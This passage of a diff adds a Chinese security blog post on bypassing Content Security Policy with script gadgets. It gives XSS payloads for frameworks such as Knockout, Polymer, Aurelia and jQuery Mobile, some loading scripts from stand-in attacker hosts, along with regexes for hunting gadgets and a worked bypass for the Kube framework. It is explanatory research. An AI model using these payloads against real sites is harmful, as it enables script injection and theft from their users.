class="string">"with($context)&#123;with($data||&#123;&#125;)&#123;return&#123;"</span> + rewrittenBindings + <span class="string">"&#125;&#125;&#125;"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"$context"</span>, <span class="string">"$element"</span>, functionBody);</span><br><span class="line"><span class="comment">// 执行上述脚本</span></span><br><span class="line"><span class="keyword">return</span> bindingFunction(bindingContext, node);</span><br></pre></td></tr></table></figure>
+
+<p>所以可以构造如下语句进行注入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-bind</span>=<span class="string">"value: alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><ul>
+<li>通过表达式解析器来进行non-eval</li>
+<li>自定义的表达式解析器安全风险</li>
+<li>表达式可被“动态编译”成Javascript</li>
+<li>代码直接操作在DOM元素、属性或原生对象等</li>
+<li>有足够多的复合表达式语言</li>
+</ul>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><ul>
+<li><p><strong>Knockout</strong>属性绑定注入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-bind</span>=<span class="string">"value: alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码分析</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取data-bind属性</span></span><br><span class="line"><span class="keyword">switch</span> (node.nodeType) &#123;</span><br><span class="line"> <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">return</span> node.getAttribute(<span class="string">"data-bind"</span>);</span><br><span class="line"><span class="comment">// 写入到rewrittenBindings</span></span><br><span class="line"><span class="keyword">var</span> rewrittenBindings = ko.expressionRewriting.preProcessBindings(bindingsString, options),</span><br><span class="line"> functionBody = <span class="string">"with($context)&#123;with($data||&#123;&#125;)&#123;return&#123;"</span> + rewrittenBindings + <span class="string">"&#125;&#125;&#125;"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"$context"</span>, <span class="string">"$element"</span>, functionBody);</span><br><span class="line"><span class="comment">// 执行上述脚本</span></span><br><span class="line"><span class="keyword">return</span> bindingFunction(bindingContext, node);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Ajaxify</strong>将文本进行类型转换</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"document-script"</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码分析</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取document-script</span></span><br><span class="line">$scripts = $dataContent.find(<span class="string">'.document-script'</span>);</span><br><span class="line"><span class="comment">// 添加script</span></span><br><span class="line">$scripts.each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $script = $(<span class="keyword">this</span>), scriptText = $script.text(), scriptNode = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">    <span class="keyword">if</span> ( $script.attr(<span class="string">'src'</span>) ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !$script[<span class="number">0</span>].async ) &#123; scriptNode.async = <span class="literal">false</span>; &#125;</span><br><span class="line">        scriptNode.src = $script.attr(<span class="string">'src'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        scriptNode.appendChild(<span class="built_in">document</span>.createTextNode(scriptText));</span><br><span class="line">    contentNode.appendChild(scriptNode);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Bootstrap-simplest</strong>直接插入html代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-toggle</span>=<span class="string">tooltip</span> <span class="attr">data-html</span>=<span class="string">true</span> <span class="attr">title</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span>aaaa<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"random"</span>&gt;</span></span><br><span class="line"><span class="javascript">  $(<span class="string">"[data-toggle=tooltip]"</span>).tooltip();</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>限制条件比较严格，tooltip的title可控且tooltip调用了<code>tooltip()</code></p>
+</li>
+<li><p><strong>Closure</strong>混淆闭包引入自定义js</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">CLOSURE_BASE_PATH</span> <span class="attr">href</span>=<span class="string">data:/,1/alert(1)//</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">CLOSURE_UNCOMPILED_DEFINES</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">goog.ENABLE_CHROME_APP_SAFE_SCRIPT_LOADING</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Require JS</strong>允许自定义js文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-main</span>=<span class="string">'data:1,alert(1)'</span> <span class="attr">src</span>=<span class="string">'require.js'</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码分析</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取data-main属性</span></span><br><span class="line">dataMain = script.getAttribute(<span class="string">'data-main'</span>);</span><br><span class="line"><span class="comment">// 加载为配置文件</span></span><br><span class="line">cfg.deps = cfg.deps ? cfg.deps.concat(mainScript) : [mainScript];</span><br><span class="line"><span class="comment">// 加载配置文件</span></span><br><span class="line">req.config = <span class="function"><span class="keyword">function</span> (<span class="params">config</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> req(config);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Ember</strong>允许动态插入script</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">text/x-handlebars</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">//attacker.example.com//</span> /&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码分析</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 提取text/x-handlebars标签</span></span><br><span class="line"><span class="keyword">var</span> selector = <span class="string">'script[type="text/x-handlebars"]'</span>;</span><br><span class="line"><span class="comment">// 设置模板</span></span><br><span class="line">setTemplate(templateName, template);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>JQuery</strong>重插入script</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"child"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"ownerDocument"</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码分析</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 插入下一个节点</span></span><br><span class="line"><span class="keyword">this</span>.parentNode.insertBefore( elem, <span class="keyword">this</span>.nextSibling );</span><br><span class="line"><span class="comment">// 运行插入代码</span></span><br><span class="line">DOMEval( node.textContent.replace( rcleanScript, <span class="string">""</span> ), doc );</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>jQuery Mobile</strong>通过HTML注入闭合注释</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'--&gt;&lt;script&gt;"use strict"</span></span></span><br><span class="line"><span class="tag"><span class="string">alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码分析</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 代码拼接直接插入html</span></span><br><span class="line"><span class="keyword">if</span> ( myId ) &#123;</span><br><span class="line">    ui.screen.attr( <span class="string">"id"</span>, myId + <span class="string">"-screen"</span> );</span><br><span class="line">    ui.container.attr( <span class="string">"id"</span>, myId + <span class="string">"-popup"</span> );</span><br><span class="line">    ui.placeholder</span><br><span class="line">        .attr( <span class="string">"id"</span>, myId + <span class="string">"-placeholder"</span> )</span><br><span class="line">        .html( <span class="string">"&lt;!-- placeholder for "</span> + myId + <span class="string">" --&gt;"</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Aurelia</strong>利用本地函数创建script</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">"me"</span></span></span><br><span class="line"><span class="tag"><span class="attr">s.bind</span>=<span class="string">"$this.me.ownerDocument.createElement('script')"</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-bar</span>=<span class="string">"$&#123;$this.me.s.src='data:,alert(1)'&#125;"</span></span></span><br><span class="line"><span class="tag"><span class="attr">data-foobar</span>=<span class="string">"$&#123;$this.me.ownerDocument.body.appendChild($this.me.s)&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Polymer 1.x</strong>重写“私人”下划线属性</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">is</span>=<span class="string">dom-bind</span>&gt;</span><span class="tag">&lt;<span class="name">div</span></span></span><br><span class="line"><span class="tag"><span class="attr">five</span>=<span class="string">&#123;&#123;insert(me._nodes.0.scriptprop)&#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="attr">four</span>=<span class="string">"&#123;&#123;set('insert',me.root.ownerDocument.body.appendChild)&#125;&#125;"</span></span></span><br><span class="line"><span class="tag"><span class="attr">three</span>=<span class="string">"&#123;&#123;set('me',nextSibling.previousSibling)&#125;&#125;"</span></span></span><br><span class="line"><span class="tag"><span class="attr">two</span>=<span class="string">&#123;&#123;set(</span>'<span class="attr">_nodes.0.scriptprop.src</span>','<span class="attr">data:</span>\,<span class="attr">alert</span>(<span class="attr">1</span>)')&#125;&#125;</span></span><br><span class="line"><span class="tag"><span class="attr">scriptprop</span>=<span class="string">&#123;&#123;_factory()&#125;&#125;</span></span></span><br><span class="line"><span class="tag"><span class="attr">one</span>=<span class="string">&#123;&#123;set(</span>'<span class="attr">_factoryArgs.0</span>','<span class="attr">script</span>')&#125;&#125; &gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>Ractive</strong>引入任意js</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">id</span>=<span class="string">'template'</span> <span class="attr">type</span>=<span class="string">'text/ractive'</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'//attacker.com/shout/'</span> /&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码分析</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取模板</span></span><br><span class="line"><span class="keyword">if</span> (!(template = doc.getElementById(id))) &#123;</span><br><span class="line">    <span class="keyword">if</span> (options &amp;&amp; options.noThrow) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">`Could not find template element with id #<span class="subst">$&#123;id&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 返回模板</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">'textContent'</span> <span class="keyword">in</span> template ? template.textContent : template.innerHTML;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>Source RegEx Mode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\.getAttribute\(</span><br><span class="line">\.attr\(</span><br></pre></td></tr></table></figure>
+
+<p>Sink RegEx Mode</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eval\(</span><br><span class="line">\.innerHTML</span><br><span class="line">new Function\(</span><br><span class="line">document\.createElement\(</span><br></pre></td></tr></table></figure>
+
+<p>我们这次的挖掘目标是<a href="https://github.com/imperavi/kube" target="_blank" rel="noopener">Kube</a>，一个轻量的CSS框架</p>
+<p>根据<strong>Knockout Gadget</strong>的思路查找是否存在函数构造</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RegEx: /new Function\(/i</span><br></pre></td></tr></table></figure>
+
+<p>漏洞链如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将字符串转为对象</span></span><br><span class="line">_toObject: <span class="function"><span class="keyword">function</span>(<span class="params">str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"return "</span> + str))(); <span class="comment">// Sink</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断是否为对象字符串</span></span><br><span class="line">_isObjectString: <span class="function"><span class="keyword">function</span>(<span class="params">str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (str.search(<span class="regexp">/^&#123;/</span>) !== <span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对data属性进行检查</span></span><br><span class="line">data: <span class="function"><span class="keyword">function</span>(<span class="params">name, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (name === <span class="literal">undefined</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> reDataAttr = <span class="regexp">/^data\-(.+)$/</span>;</span><br><span class="line">        <span class="keyword">var</span> attrs = <span class="keyword">this</span>.get().attributes;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> data = &#123;&#125;;</span><br><span class="line">        <span class="keyword">var</span> replacer = <span class="function"><span class="keyword">function</span> (<span class="params">g</span>) </span>&#123; <span class="keyword">return</span> g[<span class="number">1</span>].toUpperCase(); &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> attrs)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (attrs[key] &amp;&amp; reDataAttr.test(attrs[key].nodeName))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">var</span> dataName = attrs[key].nodeName.match(reDataAttr)[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">var</span> val = attrs[key].value;</span><br><span class="line">                dataName = dataName.replace(<span class="regexp">/-([a-z])/g</span>, replacer);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._isObjectString(val)) val = <span class="keyword">this</span>._toObject(val); <span class="comment">// Source</span></span><br><span class="line">                <span class="keyword">else</span> val = (<span class="keyword">this</span>._isNumber(val)) ? <span class="built_in">parseFloat</span>(val) : <span class="keyword">this</span>._getBooleanFromStr(val);</span><br><span class="line"></span><br><span class="line">                data[dataName] = val;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.attr(name, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload构造显然易见，直接找一个有<code>data-*</code>属性的空间，然后注入一个字典就好</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">content-security-policy</span> <span class="attr">content</span>=<span class="string">"script-src 'nonce-random' 'unsafe-eval' 'strict-dynamic'; "</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-name</span>=<span class="string">"&#123;tyao:alert(1)&#125;"</span> <span class="attr">data-kube</span>=<span class="string">"alert"</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/55836826" target="_blank" rel="noopener">深入理解output buffer</a></p>
+<p><a href="https://xz.aliyun.com/t/4165" target="_blank" rel="noopener">基于Gadgets绕过XSS防御机制</a></p>
+<p><a href="https://blog.szfszf.top/article/32/" target="_blank" rel="noopener">CSP 概念及绕过分析总结</a></p>
+<p><a href="https://www.cnblogs.com/wangtanzhi/p/12609570.html#autoid-0-9-0" target="_blank" rel="noopener">XSS之CSP绕过(转）</a></p>
+<p><a href="https://www.freebuf.com/articles/web/133455.html" target="_blank" rel="noopener">通过浏览器缓存来bypass nonce script CSP</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+    
+</div>
+      
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Bypass/" rel="tag"># Bypass</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/02/WebLogic漏洞研究/" rel="next" title="WebLogic反序列化漏洞研究">
+                <i class="fa fa-chevron-left"></i> WebLogic反序列化漏洞研究
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Tyaoo">
+            
+              <p class="site-author-name" itemprop="name">Tyaoo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Tyaoo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前提知识"><span class="nav-number">1.</span> <span class="nav-text">前提知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#探究nonce机制"><span class="nav-number">2.</span> <span class="nav-text">探究nonce机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#定义"><span class="nav-number">2.1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见绕过思路"><span class="nav-number">2.2.</span> <span class="nav-text">常见绕过思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#浏览器自动补全"><span class="nav-number">2.2.1.</span> <span class="nav-text">浏览器自动补全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Base-uri绕过"><span class="nav-number">2.2.2.</span> <span class="nav-text">Base-uri绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#meta标签绕过"><span class="nav-number">2.2.3.</span> <span class="nav-text">meta标签绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#浏览器缓存绕过"><span class="nav-number">2.2.4.</span> <span class="nav-text">浏览器缓存绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#输出缓冲区溢出绕过"><span class="nav-number">2.2.5.</span> <span class="nav-text">输出缓冲区溢出绕过</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#探究strict-dynamic机制"><span class="nav-number">3.</span> <span class="nav-text">探究strict-dynamic机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#定义-1"><span class="nav-number">3.1.</span> <span class="nav-text">定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常见绕过思路-1"><span class="nav-number">3.2.</span> <span class="nav-text">常见绕过思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#通过CSS泄露nonce"><span class="nav-number">3.2.1.</span> <span class="nav-text">通过CSS泄露nonce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Script-Gadget"><span class="nav-number">3.2.2.</span> <span class="nav-text">Script Gadget</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Script-Gadget-1"><span class="nav-number">4.</span> <span class="nav-text">Script Gadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分类"><span class="nav-number">4.1.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#产生原因"><span class="nav-number">4.2.</span> <span class="nav-text">产生原因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#例子"><span class="nav-number">4.3.</span> <span class="nav-text">例子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞挖掘"><span class="nav-number">4.4.</span> <span class="nav-text">漏洞挖掘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tyaoo</span>
+
+  
+</div>
+
+<!--
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
